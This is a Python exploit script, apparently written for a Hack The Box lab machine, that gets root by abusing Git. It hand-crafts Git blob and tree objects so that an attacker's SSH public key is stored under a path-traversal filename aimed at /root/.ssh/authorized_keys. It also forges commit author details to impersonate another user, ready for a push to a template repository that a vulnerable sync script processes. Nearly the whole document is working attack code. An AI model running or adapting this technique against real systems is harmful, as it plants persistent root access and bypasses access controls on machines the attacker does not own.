`privesc.py`

```python
#!/usr/bin/env python3

import hashlib
import os
import subprocess
import zlib

WORKDIR = "/home/melvin/htb/melvin"
PUBLIC_KEY = "/tmp/root.pub"

# Path that the vulnerable sync script will later resolve outside the staging directory.
TARGET_PATH = b"../../../../../root/.ssh/authorized_keys"


def write_object(obj_type: str, content: bytes) -> str:
    """
    Create a Git object manually and store it inside .git/objects.

    Git objects are stored as:
        <type> <size>\0<content>

    The SHA-1 of this data becomes the object's identifier.
    """

    header = f"{obj_type} {len(content)}".encode() + b"\x00"
    raw_object = header + content

    sha1 = hashlib.sha1(raw_object).hexdigest()

    object_path = os.path.join(
        WORKDIR,
        ".git",
        "objects",
        sha1[:2],
        sha1[2:],
    )

    os.makedirs(os.path.dirname(object_path), exist_ok=True)

    with open(object_path, "wb") as f:
        f.write(zlib.compress(raw_object))

    return sha1


# ----------------------------------------------------------------------
# Create an empty repository
# ----------------------------------------------------------------------

os.makedirs(WORKDIR, exist_ok=True)

subprocess.run(["git", "init"], cwd=WORKDIR, check=True)

subprocess.run(["git", "config", "user.name", "attacker"], cwd=WORKDIR)
subprocess.run(["git", "config", "user.email", "attacker@example.com"], cwd=WORKDIR)


# ----------------------------------------------------------------------
# Step 1: Create a blob containing our SSH public key
# ----------------------------------------------------------------------

with open(PUBLIC_KEY, "rb") as f:
    public_key = f.read()

blob_sha = write_object("blob", public_key)

print(f"Blob: {blob_sha}")


# ----------------------------------------------------------------------
# Step 2: Create a tree with a malicious filename
#
# Tree entries have this binary format:
#
#   <mode> <filename>\0<20-byte object id>
#
# Instead of a normal filename, we use a traversal path.
# ----------------------------------------------------------------------

tree_entry = (
    b"100644 "
    + TARGET_PATH
    + b"\x00"
    + bytes.fromhex(blob_sha)
)

tree_sha = write_object("tree", tree_entry)

print(f"Tree: {tree_sha}")


# ----------------------------------------------------------------------
# Step 3: Create a commit pointing to that tree
# ----------------------------------------------------------------------

env = {
    **os.environ,
    "GIT_AUTHOR_NAME": "jones",
    "GIT_AUTHOR_EMAIL": "j.matthew@nexus.htb",
    "GIT_COMMITTER_NAME": "jones",
    "GIT_COMMITTER_EMAIL": "j.matthew@nexus.htb",
}

commit_sha = subprocess.run(
    [
        "git",
        "commit-tree",
        tree_sha,
        "-m",
        "Initial commit",
    ],
    cwd=WORKDIR,
    env=env,
    capture_output=True,
    text=True,
    check=True,
).stdout.strip()

print(f"Commit: {commit_sha}")

print("\nRepository is ready.")
print("The only remaining step is to push this commit to the template repository.")
```
